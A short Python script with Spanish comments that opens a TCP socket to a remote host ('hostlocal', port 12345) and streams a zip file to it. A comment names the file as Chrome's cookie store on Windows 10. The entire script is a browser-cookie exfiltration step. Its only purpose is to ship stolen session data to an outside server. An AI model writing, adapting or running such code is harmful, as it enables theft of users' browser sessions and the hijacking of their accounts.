import os
import socket

# Ubicación del archivo de cookies de Chrome en Windows 10
cookies_path ="./results.zip"

# Configuración del socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = 'hostlocal'
port = 12345  

# Conecta al servidor remoto
s.connect((host, port))

# Envía el nombre del archivo
filename = os.path.basename(cookies_path)
s.send(filename.encode('utf-8'))

# Abre el archivo que deseas enviar
with open(cookies_path, 'rb') as f:
    # Lee los datos del archivo en bloques de 1024 bytes
    data = f.read(1024)
    while data:
        # Envía los datos al servidor
        s.send(data)
        # Lee el siguiente bloque de datos del archivo
        data = f.read(1024)

print('Archivo enviado correctamente')
s.close()
